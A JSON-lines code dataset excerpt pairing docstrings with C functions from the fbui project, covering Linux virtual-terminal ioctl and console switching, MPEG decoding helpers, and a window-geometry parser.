horizontal_size>>1,vertical_size>>1,vertical_subsampling_factor_m,\n     vertical_subsampling_factor_n,horizontal_subsampling_factor_m,\n     horizontal_subsampling_factor_n,1);\n\n}", "path": "libfbui\\MPEG\\spatscal.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/*\n * Performs the front-end of a vt switch\n */\n", "func_signal": "void change_console(unsigned int new_console)", "code": "{\n        if ((new_console == fg_console) || (vt_dont_switch))\n                return;\n        if (!vc_cons_allocated(new_console))\n\t\treturn;\n\n\t/*\n\t * If this vt is in process mode, then we need to handshake with\n\t * that process before switching. Essentially, we store where that\n\t * vt wants to switch to and wait for it to tell us when it's done\n\t * (via VT_RELDISP ioctl).\n\t *\n\t * We also check to see if the controlling process still exists.\n\t * If it doesn't, we reset this vt to auto mode and continue.\n\t * This is a cheap way to track process control. The worst thing\n\t * that can happen is: we send a signal to a process, it dies, and\n\t * the switch gets \"lost\" waiting for a response; hopefully, the\n\t * user will try again, we'll detect the process is gone (unless\n\t * the user waits just the right amount of time :-) and revert the\n\t * vt to auto control.\n\t */\n\tif (vt_cons[fg_console]->vt_mode.mode == VT_PROCESS)\n\t{\n\t\t/*\n\t\t * Send the signal as privileged - kill_proc() will\n\t\t * tell us if the process has gone or something else\n\t\t * is awry\n\t\t */\n\t\tif (kill_proc(vt_cons[fg_console]->vt_pid,\n\t\t\t      vt_cons[fg_console]->vt_mode.relsig,\n\t\t\t      1) == 0)\n\t\t{\n\t\t\t/*\n\t\t\t * It worked. Mark the vt to switch to and\n\t\t\t * return. The process needs to send us a\n\t\t\t * VT_RELDISP ioctl to complete the switch.\n\t\t\t */\n\t\t\tvt_cons[fg_console]->vt_newvt = new_console;\n\t\t\treturn;\n\t\t}\n\n\t\t/*\n\t\t * The controlling process has died, so we revert back to\n\t\t * normal operation. In this case, we'll also change back\n\t\t * to KD_TEXT mode. I'm not sure if this is strictly correct\n\t\t * but it saves the agony when the X server dies and the screen\n\t\t * remains blanked due to KD_GRAPHICS! It would be nice to do\n\t\t * this outside of VT_PROCESS but there is no single process\n\t\t * to account for and tracking tty count may be undesirable.\n\t\t */\n\t\treset_vc(fg_console);\n\n\t\t/*\n\t\t * Fall through to normal (VT_AUTO) handling of the switch...\n\t\t */\n\t}\n\n\t/*\n\t * Ignore all switches in KD_GRAPHICS+VT_AUTO mode\n\t */\n#ifndef CONFIG_FB_UI\n\tif (vt_cons[fg_console]->vc_mode == KD_GRAPHICS)\n\t\treturn;\n#endif\n\n\tcomplete_change_console(new_console);\n}", "path": "drivers\\char\\vt_ioctl.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/*\n * We handle the console-specific ioctl's here.  We allow the\n * capability to modify any console, not just the fg_console. \n */\n", "func_signal": "int vt_ioctl(struct tty_struct *tty, struct file * file,\n\t     unsigned int cmd, unsigned long arg)", "code": "{\n\tstruct vt_struct *vt = (struct vt_struct *)tty->driver_data;\n\tstruct vc_data *vc = vc_cons[vt->vc_num].d;\n\tstruct console_font_op op;\t/* used in multiple places here */\n\tstruct kbd_struct * kbd;\n\tunsigned int console;\n\tunsigned char ucval;\n\tvoid __user *up = (void __user *)arg;\n\tint i, perm;\n\t\n\tconsole = vt->vc_num;\n\n\tif (!vc_cons_allocated(console)) \t/* impossible? */\n\t\treturn -ENOIOCTLCMD;\n\n\t/*\n\t * To have permissions to do most of the vt ioctls, we either have\n\t * to be the owner of the tty, or have CAP_SYS_TTY_CONFIG.\n\t */\n\tperm = 0;\n\tif (current->signal->tty == tty || capable(CAP_SYS_TTY_CONFIG))\n\t\tperm = 1;\n \n\tkbd = kbd_table + console;\n\tswitch (cmd) {\n\tcase KIOCSOUND:\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\tif (arg)\n\t\t\targ = 1193182 / arg;\n\t\tkd_mksound(arg, 0);\n\t\treturn 0;\n\n\tcase KDMKTONE:\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t{\n\t\tunsigned int ticks, count;\n\t\t\n\t\t/*\n\t\t * Generate the tone for the appropriate number of ticks.\n\t\t * If the time is zero, turn off sound ourselves.\n\t\t */\n\t\tticks = HZ * ((arg >> 16) & 0xffff) / 1000;\n\t\tcount = ticks ? (arg & 0xffff) : 0;\n\t\tif (count)\n\t\t\tcount = 1193182 / count;\n\t\tkd_mksound(count, ticks);\n\t\treturn 0;\n\t}\n\n\tcase KDGKBTYPE:\n\t\t/*\n\t\t * this is naive.\n\t\t */\n\t\tucval = keyboard_type;\n\t\tgoto setchar;\n\n\t\t/*\n\t\t * These cannot be implemented on any machine that implements\n\t\t * ioperm() in user level (such as Alpha PCs) or not at all.\n\t\t *\n\t\t * XXX: you should never use these, just call ioperm directly..\n\t\t */\n#ifdef CONFIG_X86\n\tcase KDADDIO:\n\tcase KDDELIO:\n\t\t/*\n\t\t * KDADDIO and KDDELIO may be able to add ports beyond what\n\t\t * we reject here, but to be safe...\n\t\t */\n\t\tif (arg < GPFIRST || arg > GPLAST)\n\t\t\treturn -EINVAL;\n\t\treturn sys_ioperm(arg, 1, (cmd == KDADDIO)) ? -ENXIO : 0;\n\n\tcase KDENABIO:\n\tcase KDDISABIO:\n\t\treturn sys_ioperm(GPFIRST, GPNUM,\n\t\t\t\t  (cmd == KDENABIO)) ? -ENXIO : 0;\n#endif\n\n\t/* Linux m68k/i386 interface for setting the keyboard delay/repeat rate */\n\t\t\n\tcase KDKBDREP:\n\t{\n\t\tstruct kbd_repeat kbrep;\n\t\tint err;\n\t\t\n\t\tif (!capable(CAP_SYS_TTY_CONFIG))\n\t\t\treturn -EPERM;\n\n\t\tif (copy_from_user(&kbrep, up, sizeof(struct kbd_repeat)))\n\t\t\treturn -EFAULT;\n\t\terr = kbd_rate(&kbrep);\n\t\tif (err)\n\t\t\treturn err;\n\t\tif (copy_to_user(up, &kbrep, sizeof(struct kbd_repeat)))\n\t\t\treturn -EFAULT;\n\t\treturn 0;\n\t}\n\n\tcase KDSETMODE:\n\t\t/*\n\t\t * currently, setting the mode from KD_TEXT to KD_GRAPHICS\n\t\t * doesn't do a whole lot. i'm not sure if it should do any\n\t\t * restoration of modes or what...\n\t\t *\n\t\t * XXX It should at least call into the driver, fbdev's definitely\n\t\t * need to restore their engine state. --BenH\n\t\t */\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\tswitch (arg) {\n\t\tcase KD_GRAPHICS:\n\t\t\tbreak;\n\t\tcase KD_TEXT0:\n\t\tcase KD_TEXT1:\n\t\t\targ = KD_TEXT;\n\t\tcase KD_TEXT:\n\t\t\tbreak;\n\t\tdefault:\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tif (vt_cons[console]->vc_mode == (unsigned char) arg)\n\t\t\treturn 0;\n\t\tvt_cons[console]->vc_mode = (unsigned char) arg;\n\t\tif (console != fg_console)\n\t\t\treturn 0;\n\t\t/*\n\t\t * explicitly blank/unblank the screen if switching modes\n\t\t */\n\t\tacquire_console_sem();\n\t\tif (arg == KD_TEXT)\n\t\t\tdo_unblank_screen(1);\n\t\telse\n\t\t\tdo_blank_screen(1);\n\t\trelease_console_sem();\n\t\treturn 0;\n\n\tcase KDGETMODE:\n\t\tucval = vt_cons[console]->vc_mode;\n\t\tgoto setint;\n\n\tcase KDMAPDISP:\n\tcase KDUNMAPDISP:\n\t\t/*\n\t\t * these work like a combination of mmap and KDENABIO.\n\t\t * this could be easily finished.\n\t\t */\n\t\treturn -EINVAL;\n\n\tcase KDSKBMODE:\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\tswitch(arg) {\n\t\t  case K_RAW:\n\t\t\tkbd->kbdmode = VC_RAW;\n\t\t\tbreak;\n\t\t  case K_MEDIUMRAW:\n\t\t\tkbd->kbdmode = VC_MEDIUMRAW;\n\t\t\tbreak;\n\t\t  case K_XLATE:\n\t\t\tkbd->kbdmode = VC_XLATE;\n\t\t\tcompute_shiftstate();\n\t\t\tbreak;\n\t\t  case K_UNICODE:\n\t\t\tkbd->kbdmode = VC_UNICODE;\n\t\t\tcompute_shiftstate();\n\t\t\tbreak;\n\t\t  default:\n\t\t\treturn -EINVAL;\n\t\t}\n\t\ttty_ldisc_flush(tty);\n\t\treturn 0;\n\n\tcase KDGKBMODE:\n\t\tucval = ((kbd->kbdmode == VC_RAW) ? K_RAW :\n\t\t\t\t (kbd->kbdmode == VC_MEDIUMRAW) ? K_MEDIUMRAW :\n\t\t\t\t (kbd->kbdmode == VC_UNICODE) ? K_UNICODE :\n\t\t\t\t K_XLATE);\n\t\tgoto setint;\n\n\t/* this could be folded into KDSKBMODE, but for compatibility\n\t   reasons it is not so easy to fold KDGKBMETA into KDGKBMODE */\n\tcase KDSKBMETA:\n\t\tswitch(arg) {\n\t\t  case K_METABIT:\n\t\t\tclr_vc_kbd_mode(kbd, VC_META);\n\t\t\tbreak;\n\t\t  case K_ESCPREFIX:\n\t\t\tset_vc_kbd_mode(kbd, VC_META);\n\t\t\tbreak;\n\t\t  default:\n\t\t\treturn -EINVAL;\n\t\t}\n\t\treturn 0;\n\n\tcase KDGKBMETA:\n\t\tucval = (vc_kbd_mode(kbd, VC_META) ? K_ESCPREFIX : K_METABIT);\n\tsetint:\n\t\treturn put_user(ucval, (int __user *)arg); \n\n\tcase KDGETKEYCODE:\n\tcase KDSETKEYCODE:\n\t\tif(!capable(CAP_SYS_TTY_CONFIG))\n\t\t\tperm=0;\n\t\treturn do_kbkeycode_ioctl(cmd, up, perm);\n\n\tcase KDGKBENT:\n\tcase KDSKBENT:\n\t\treturn do_kdsk_ioctl(cmd, up, perm, kbd);\n\n\tcase KDGKBSENT:\n\tcase KDSKBSENT:\n\t\treturn do_kdgkb_ioctl(cmd, up, perm);\n\n\tcase KDGKBDIACR:\n\t{\n\t\tstruct kbdiacrs __user *a = up;\n\n\t\tif (put_user(accent_table_size, &a->kb_cnt))\n\t\t\treturn -EFAULT;\n\t\tif (copy_to_user(a->kbdiacr, accent_table, accent_table_size*sizeof(struct kbdiacr)))\n\t\t\treturn -EFAULT;\n\t\treturn 0;\n\t}\n\n\tcase KDSKBDIACR:\n\t{\n\t\tstruct kbdiacrs __user *a = up;\n\t\tunsigned int ct;\n\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\tif (get_user(ct,&a->kb_cnt))\n\t\t\treturn -EFAULT;\n\t\tif (ct >= MAX_DIACR)\n\t\t\treturn -EINVAL;\n\t\taccent_table_size = ct;\n\t\tif (copy_from_user(accent_table, a->kbdiacr, ct*sizeof(struct kbdiacr)))\n\t\t\treturn -EFAULT;\n\t\treturn 0;\n\t}\n\n\t/* the ioctls below read/set the flags usually shown in the leds */\n\t/* don't use them - they will go away without warning */\n\tcase KDGKBLED:\n\t\tucval = kbd->ledflagstate | (kbd->default_ledflagstate << 4);\n\t\tgoto setchar;\n\n\tcase KDSKBLED:\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\tif (arg & ~0x77)\n\t\t\treturn -EINVAL;\n\t\tkbd->ledflagstate = (arg & 7);\n\t\tkbd->default_ledflagstate = ((arg >> 4) & 7);\n\t\tset_leds();\n\t\treturn 0;\n\n\t/* the ioctls below only set the lights, not the functions */\n\t/* for those, see KDGKBLED and KDSKBLED above */\n\tcase KDGETLED:\n\t\tucval = getledstate();\n\tsetchar:\n\t\treturn put_user(ucval, (char __user *)arg);\n\n\tcase KDSETLED:\n\t\tif (!perm)\n\t\t  return -EPERM;\n\t\tsetledstate(kbd, arg);\n\t\treturn 0;\n\n\t/*\n\t * A process can indicate its willingness to accept signals\n\t * generated by pressing an appropriate key combination.\n\t * Thus, one can have a daemon that e.g. spawns a new console\n\t * upon a keypress and then changes to it.\n\t * See also the kbrequest field of inittab(5).\n\t */\n\tcase KDSIGACCEPT:\n\t{\n\t\textern int spawnpid, spawnsig;\n\t\tif (!perm || !capable(CAP_KILL))\n\t\t  return -EPERM;\n\t\tif (arg < 1 || arg > _NSIG || arg == SIGKILL)\n\t\t  return -EINVAL;\n\t\tspawnpid = current->pid;\n\t\tspawnsig = arg;\n\t\treturn 0;\n\t}\n\n\tcase VT_SETMODE:\n\t{\n\t\tstruct vt_mode tmp;\n\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\tif (copy_from_user(&tmp, up, sizeof(struct vt_mode)))\n\t\t\treturn -EFAULT;\n\t\tif (tmp.mode != VT_AUTO && tmp.mode != VT_PROCESS)\n\t\t\treturn -EINVAL;\n\t\tacquire_console_sem();\n\t\tvt_cons[console]->vt_mode = tmp;\n\t\t/* the frsig is ignored, so we set it to 0 */\n\t\tvt_cons[console]->vt_mode.frsig = 0;\n\t\tvt_cons[console]->vt_pid = current->pid;\n\t\t/* no switch is required -- saw@shade.msu.ru */\n\t\tvt_cons[console]->vt_newvt = -1; \n\t\trelease_console_sem();\n\t\treturn 0;\n\t}\n\n\tcase VT_GETMODE:\n\t{\n\t\tstruct vt_mode tmp;\n\t\tint rc;\n\n\t\tacquire_console_sem();\n\t\tmemcpy(&tmp, &vt_cons[console]->vt_mode, sizeof(struct vt_mode));\n\t\trelease_console_sem();\n\n\t\trc = copy_to_user(up, &tmp, sizeof(struct vt_mode));\n\t\treturn rc ? -EFAULT : 0;\n\t}\n\n\t/*\n\t * Returns global vt state. Note that VT 0 is always open, since\n\t * it's an alias for the current VT, and people can't use it here.\n\t * We cannot return state for more than 16 VTs, since v_state is short.\n\t */\n\tcase VT_GETSTATE:\n\t{\n\t\tstruct vt_stat __user *vtstat = up;\n\t\tunsigned short state, mask;\n\n\t\tif (put_user(fg_console + 1, &vtstat->v_active))\n\t\t\treturn -EFAULT;\n\t\tstate = 1;\t/* /dev/tty0 is always open */\n\t\tfor (i = 0, mask = 2; i < MAX_NR_CONSOLES && mask; ++i, mask <<= 1)\n\t\t\tif (VT_IS_IN_USE(i))\n\t\t\t\tstate |= mask;\n\t\treturn put_user(state, &vtstat->v_state);\n\t}\n\n\t/*\n\t * Returns the first available (non-opened) console.\n\t */\n\tcase VT_OPENQRY:\n\t\tfor (i = 0; i < MAX_NR_CONSOLES; ++i)\n\t\t\tif (! VT_IS_IN_USE(i))\n\t\t\t\tbreak;\n\t\tucval = i < MAX_NR_CONSOLES ? (i+1) : -1;\n\t\tgoto setint;\t\t \n\n\t/*\n\t * ioctl(fd, VT_ACTIVATE, num) will cause us to switch to vt # num,\n\t * with num >= 1 (switches to vt 0, our console, are not allowed, just\n\t * to preserve sanity).\n\t */\n\tcase VT_ACTIVATE:\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\tif (arg == 0 || arg > MAX_NR_CONSOLES)\n\t\t\treturn -ENXIO;\n\t\targ--;\n\t\tacquire_console_sem();\n\t\ti = vc_allocate(arg);\n\t\trelease_console_sem();\n\t\tif (i)\n\t\t\treturn i;\n\t\tset_console(arg);\n\t\treturn 0;\n\n\t/*\n\t * wait until the specified VT has been activated\n\t */\n\tcase VT_WAITACTIVE:\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\tif (arg == 0 || arg > MAX_NR_CONSOLES)\n\t\t\treturn -ENXIO;\n\t\treturn vt_waitactive(arg-1);\n\n\t/*\n\t * If a vt is under process control, the kernel will not switch to it\n\t * immediately, but postpone the operation until the process calls this\n\t * ioctl, allowing the switch to complete.\n\t *\n\t * According to the X sources this is the behavior:\n\t *\t0:\tpending switch-from not OK\n\t *\t1:\tpending switch-from OK\n\t *\t2:\tcompleted switch-to OK\n\t */\n\tcase VT_RELDISP:\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\tif (vt_cons[console]->vt_mode.mode != VT_PROCESS)\n\t\t\treturn -EINVAL;\n\n\t\t/*\n\t\t * Switching-from response\n\t\t */\n\t\tif (vt_cons[console]->vt_newvt >= 0)\n\t\t{\n\t\t\tif (arg == 0)\n\t\t\t\t/*\n\t\t\t\t * Switch disallowed, so forget we were trying\n\t\t\t\t * to do it.\n\t\t\t\t */\n\t\t\t\tvt_cons[console]->vt_newvt = -1;\n\n\t\t\telse\n\t\t\t{\n\t\t\t\t/*\n\t\t\t\t * The current vt has been released, so\n\t\t\t\t * complete the switch.\n\t\t\t\t */\n\t\t\t\tint newvt;\n\t\t\t\tacquire_console_sem();\n\t\t\t\tnewvt = vt_cons[console]->vt_newvt;\n\t\t\t\tvt_cons[console]->vt_newvt = -1;\n\t\t\t\ti = vc_allocate(newvt);\n\t\t\t\tif (i) {\n\t\t\t\t\trelease_console_sem();\n\t\t\t\t\treturn i;\n\t\t\t\t}\n\t\t\t\t/*\n\t\t\t\t * When we actually do the console switch,\n\t\t\t\t * make sure we are atomic with respect to\n\t\t\t\t * other console switches..\n\t\t\t\t */\n\t\t\t\tcomplete_change_console(newvt);\n\t\t\t\trelease_console_sem();\n\t\t\t}\n\t\t}\n\n\t\t/*\n\t\t * Switched-to response\n\t\t */\n\t\telse\n\t\t{\n\t\t\t/*\n\t\t\t * If it's just an ACK, ignore it\n\t\t\t */\n\t\t\tif (arg != VT_ACKACQ)\n\t\t\t\treturn -EINVAL;\n\t\t}\n\n\t\treturn 0;\n\n\t /*\n\t  * Disallocate memory associated to VT (but leave VT1)\n\t  */\n\t case VT_DISALLOCATE:\n\t\tif (arg > MAX_NR_CONSOLES)\n\t\t\treturn -ENXIO;\n\t\tif (arg == 0) {\n\t\t    /* disallocate all unused consoles, but leave 0 */\n\t\t\tacquire_console_sem();\n\t\t\tfor (i=1; i<MAX_NR_CONSOLES; i++)\n\t\t\t\tif (! VT_BUSY(i))\n\t\t\t\t\tvc_disallocate(i);\n\t\t\trelease_console_sem();\n\t\t} else {\n\t\t\t/* disallocate a single console, if possible */\n\t\t\targ--;\n\t\t\tif (VT_BUSY(arg))\n\t\t\t\treturn -EBUSY;\n\t\t\tif (arg) {\t\t\t      /* leave 0 */\n\t\t\t\tacquire_console_sem();\n\t\t\t\tvc_disallocate(arg);\n\t\t\t\trelease_console_sem();\n\t\t\t}\n\t\t}\n\t\treturn 0;\n\n\tcase VT_RESIZE:\n\t{\n\t\tstruct vt_sizes __user *vtsizes = up;\n\t\tushort ll,cc;\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\tif (get_user(ll, &vtsizes->v_rows) ||\n\t\t    get_user(cc, &vtsizes->v_cols))\n\t\t\treturn -EFAULT;\n\t\tfor (i = 0; i < MAX_NR_CONSOLES; i++) {\n\t\t\tacquire_console_sem();\n                        vc_resize(i, cc, ll);\n\t\t\trelease_console_sem();\n\t\t}\n\t\treturn 0;\n\t}\n\n\tcase VT_RESIZEX:\n\t{\n\t\tstruct vt_consize __user *vtconsize = up;\n\t\tushort ll,cc,vlin,clin,vcol,ccol;\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\tif (verify_area(VERIFY_READ, vtconsize,\n\t\t\t\tsizeof(struct vt_consize)))\n\t\t\treturn -EFAULT;\n\t\t__get_user(ll, &vtconsize->v_rows);\n\t\t__get_user(cc, &vtconsize->v_cols);\n\t\t__get_user(vlin, &vtconsize->v_vlin);\n\t\t__get_user(clin, &vtconsize->v_clin);\n\t\t__get_user(vcol, &vtconsize->v_vcol);\n\t\t__get_user(ccol, &vtconsize->v_ccol);\n\t\tvlin = vlin ? vlin : vc->vc_scan_lines;\n\t\tif (clin) {\n\t\t\tif (ll) {\n\t\t\t\tif (ll != vlin/clin)\n\t\t\t\t\treturn -EINVAL; /* Parameters don't add up */\n\t\t\t} else \n\t\t\t\tll = vlin/clin;\n\t\t}\n\t\tif (vcol && ccol) {\n\t\t\tif (cc) {\n\t\t\t\tif (cc != vcol/ccol)\n\t\t\t\t\treturn -EINVAL;\n\t\t\t} else\n\t\t\t\tcc = vcol/ccol;\n\t\t}\n\n\t\tif (clin > 32)\n\t\t\treturn -EINVAL;\n\t\t    \n\t\tfor (i = 0; i < MAX_NR_CONSOLES; i++) {\n\t\t\tif (!vc_cons[i].d)\n\t\t\t\tcontinue;\n\t\t\tacquire_console_sem();\n\t\t\tif (vlin)\n\t\t\t\tvc_cons[i].d->vc_scan_lines = vlin;\n\t\t\tif (clin)\n\t\t\t\tvc_cons[i].d->vc_font.height = clin;\n\t\t\tvc_resize(i, cc, ll);\n\t\t\trelease_console_sem();\n\t\t}\n  \t\treturn 0;\n\t}\n\n\tcase PIO_FONT: {\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\top.op = KD_FONT_OP_SET;\n\t\top.flags = KD_FONT_FLAG_OLD | KD_FONT_FLAG_DONT_RECALC;\t/* Compatibility */\n\t\top.width = 8;\n\t\top.height = 0;\n\t\top.charcount = 256;\n\t\top.data = up;\n\t\treturn con_font_op(fg_console, &op);\n\t}\n\n\tcase GIO_FONT: {\n\t\top.op = KD_FONT_OP_GET;\n\t\top.flags = KD_FONT_FLAG_OLD;\n\t\top.width = 8;\n\t\top.height = 32;\n\t\top.charcount = 256;\n\t\top.data = up;\n\t\treturn con_font_op(fg_console, &op);\n\t}\n\n\tcase PIO_CMAP:\n                if (!perm)\n\t\t\treturn -EPERM;\n                return con_set_cmap(up);\n\n\tcase GIO_CMAP:\n                return con_get_cmap(up);\n\n\tcase PIO_FONTX:\n\tcase GIO_FONTX:\n\t\treturn do_fontx_ioctl(cmd, up, perm, &op);\n\n\tcase PIO_FONTRESET:\n\t{\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\n#ifdef BROKEN_GRAPHICS_PROGRAMS\n\t\t/* With BROKEN_GRAPHICS_PROGRAMS defined, the default\n\t\t   font is not saved. */\n\t\treturn -ENOSYS;\n#else\n\t\t{\n\t\top.op = KD_FONT_OP_SET_DEFAULT;\n\t\top.data = NULL;\n\t\ti = con_font_op(fg_console, &op);\n\t\tif (i) return i;\n\t\tcon_set_default_unimap(fg_console);\n\t\treturn 0;\n\t\t}\n#endif\n\t}\n\n\tcase KDFONTOP: {\n\t\tif (copy_from_user(&op, up, sizeof(op)))\n\t\t\treturn -EFAULT;\n\t\tif (!perm && op.op != KD_FONT_OP_GET)\n\t\t\treturn -EPERM;\n\t\ti = con_font_op(console, &op);\n\t\tif (i) return i;\n\t\tif (copy_to_user(up, &op, sizeof(op)))\n\t\t\treturn -EFAULT;\n\t\treturn 0;\n\t}\n\n\tcase PIO_SCRNMAP:\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\treturn con_set_trans_old(up);\n\n\tcase GIO_SCRNMAP:\n\t\treturn con_get_trans_old(up);\n\n\tcase PIO_UNISCRNMAP:\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\treturn con_set_trans_new(up);\n\n\tcase GIO_UNISCRNMAP:\n\t\treturn con_get_trans_new(up);\n\n\tcase PIO_UNIMAPCLR:\n\t      { struct unimapinit ui;\n\t\tif (!perm)\n\t\t\treturn -EPERM;\n\t\ti = copy_from_user(&ui, up, sizeof(struct unimapinit));\n\t\tif (i) return -EFAULT;\n\t\tcon_clear_unimap(console, &ui);\n\t\treturn 0;\n\t      }\n\n\tcase PIO_UNIMAP:\n\tcase GIO_UNIMAP:\n\t\treturn do_unimap_ioctl(cmd, up, perm, console);\n\n\tcase VT_LOCKSWITCH:\n\t\tif (!capable(CAP_SYS_TTY_CONFIG))\n\t\t   return -EPERM;\n\t\tvt_dont_switch = 1;\n\t\treturn 0;\n\tcase VT_UNLOCKSWITCH:\n\t\tif (!capable(CAP_SYS_TTY_CONFIG))\n\t\t   return -EPERM;\n\t\tvt_dont_switch = 0;\n\t\treturn 0;\n\tdefault:\n\t\treturn -ENOIOCTLCMD;\n\t}\n}", "path": "drivers\\char\\vt_ioctl.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/*\n * Performs the back end of a vt switch\n */\n", "func_signal": "void complete_change_console(unsigned int new_console)", "code": "{\n\tunsigned char old_vc_mode;\n\n\tlast_console = fg_console;\n\n\t/*\n\t * If we're switching, we could be going from KD_GRAPHICS to\n\t * KD_TEXT mode or vice versa, which means we need to blank or\n\t * unblank the screen later.\n\t */\n\told_vc_mode = vt_cons[fg_console]->vc_mode;\n\tswitch_screen(new_console);\n\n\t/*\n\t * This can't appear below a successful kill_proc().  If it did,\n\t * then the *blank_screen operation could occur while X, having\n\t * received acqsig, is waking up on another processor.  This\n\t * condition can lead to overlapping accesses to the VGA range\n\t * and the framebuffer (causing system lockups).\n\t *\n\t * To account for this we duplicate this code below only if the\n\t * controlling process is gone and we've called reset_vc.\n\t */\n\tif (old_vc_mode != vt_cons[new_console]->vc_mode)\n\t{\n\t\tif (vt_cons[new_console]->vc_mode == KD_TEXT)\n\t\t\tdo_unblank_screen(1);\n\t\telse\n\t\t\tdo_blank_screen(1);\n\t}\n\n\t/*\n\t * If this new console is under process control, send it a signal\n\t * telling it that it has acquired. Also check if it has died and\n\t * clean up (similar to logic employed in change_console())\n\t */\n\tif (vt_cons[new_console]->vt_mode.mode == VT_PROCESS)\n\t{\n\t\t/*\n\t\t * Send the signal as privileged - kill_proc() will\n\t\t * tell us if the process has gone or something else\n\t\t * is awry\n\t\t */\n\t\tif (kill_proc(vt_cons[new_console]->vt_pid,\n\t\t\t      vt_cons[new_console]->vt_mode.acqsig,\n\t\t\t      1) != 0)\n\t\t{\n\t\t/*\n\t\t * The controlling process has died, so we revert back to\n\t\t * normal operation. In this case, we'll also change back\n\t\t * to KD_TEXT mode. I'm not sure if this is strictly correct\n\t\t * but it saves the agony when the X server dies and the screen\n\t\t * remains blanked due to KD_GRAPHICS! It would be nice to do\n\t\t * this outside of VT_PROCESS but there is no single process\n\t\t * to account for and tracking tty count may be undesirable.\n\t\t */\n\t\t        reset_vc(new_console);\n\n\t\t\tif (old_vc_mode != vt_cons[new_console]->vc_mode)\n\t\t\t{\n\t\t\t\tif (vt_cons[new_console]->vc_mode == KD_TEXT)\n\t\t\t\t\tdo_unblank_screen(1);\n\t\t\t\telse\n\t\t\t\t\tdo_blank_screen(1);\n\t\t\t}\n\t\t}\n\t}\n\n\t/*\n\t * Wake anyone waiting for their VT to activate\n\t */\n\tvt_wake_waitactive();\n\treturn;\n}", "path": "drivers\\char\\vt_ioctl.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* get differential motion vector (for dual prime prediction) */\n", "func_signal": "int Get_dmvector()", "code": "{\n#ifdef TRACE\n  if (Trace_Flag)\n    printf(\"dmvector (\");\n#endif /* TRACE */\n\n  if (Get_Bits(1))\n  {\n#ifdef TRACE\n    if (Trace_Flag)\n      printf(Show_Bits(1) ? \"11): -1\\n\" : \"10): 1\\n\");\n#endif /* TRACE */\n    return Get_Bits(1) ? -1 : 1;\n  }\n  else\n  {\n#ifdef TRACE\n    if (Trace_Flag)\n      printf(\"0): 0\\n\");\n#endif /* TRACE */\n    return 0;\n  }\n}", "path": "libfbui\\MPEG\\getvlc.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* not static since it's used by fbterm */\n", "func_signal": "int fbui_parse_geom (char *s1, short *w, short *h, short *xr, short *yr)", "code": "{\n\tshort width=0,height=0,xrel=-1,yrel=-1;\n\tchar *s2 = NULL;\n\tchar *s3 = NULL;\n\tchar *s4 = NULL;\n\n\tif (!s1 || !w || !h || !xr || !yr)\n\t\treturn 0;\n\t/*---------------*/\n\n\tif (*s1 && isdigit(*s1)) {\n\t\tchar *s2 = strchr (s1, 'x');\n\t\tif (!s2)\n\t\t\treturn 0;\n\t\t*s2++ = 0;\n\n\t\ts3 = s2;\n\t\twhile (*s3 && isdigit(*s3))\n\t\t\ts3++;\n\n\t\tif (*s3) {\n\t\t\txrel = *s3=='-' ? -1 : 1;\n\t\t\t*s3++ = 0;\n\n\t\t\ts4 = s3;\n\t\t\twhile (*s4 && isdigit(*s4))\n\t\t\t\ts4++;\n\n\t\t\tif (s4) {\n\t\t\t\tyrel = *s4=='-' ? -1 : 1;\n\t\t\t\t*s4++ = 0;\n\t\t\t}\n\t\t} else {\n\t\t\txrel = 9999; /* no position given */\n\t\t\ts3 = NULL;\n\t\t}\n\n\t\twidth = atoi(s1);\n\t\theight = atoi(s2);\n\n\t\tif (s3 && s4) {\n\t\t\tint a = atoi(s3);\n\t\t\tint b = atoi(s4);\n\t\t\tif (xrel == 1) {\n\t\t\t\txrel = a;\n\t\t\t} else {\n\t\t\t\txrel = -a - 1;\n\t\t\t}\n\t\t\tif (yrel == 1) {\n\t\t\t\tyrel = b;\n\t\t\t} else {\n\t\t\t\tyrel = -b - 1;\n\t\t\t}\n\t\t} else {\n\t\t\txrel = 9999;\n\t\t}\n\t\t*w = width;\n\t\t*h = height;\n\t\t*xr = xrel;\n\t\t*yr = yrel;\n\t\treturn 1;\n\t} else\n\t\treturn 0;\n}", "path": "libfbui\\libfbui.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/* macroblock_type for pictures with spatial scalability */\n", "func_signal": "static int Get_I_Spatial_macroblock_type()", "code": "{\n  int code;\n\n#ifdef TRACE\n  if (Trace_Flag)\n    printf(\"macroblock_type(I,spat) (\");\n#endif /* TRACE */\n\n  code = Show_Bits(4);\n\n  if (code==0)\n  {\n    if (!Quiet_Flag)\n      printf(\"Invalid macroblock_type code\\n\");\n    Fault_Flag = 1;\n    return 0;\n  }\n\n#ifdef TRACE\n  if (Trace_Flag)\n  {\n    Print_Bits(code,4,spIMBtab[code].len);\n    printf(\"): %02x\\n\",spIMBtab[code].val);\n  }\n#endif /* TRACE */\n\n  Flush_Buffer(spIMBtab[code].len);\n  return spIMBtab[code].val;\n}", "path": "libfbui\\MPEG\\getvlc.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
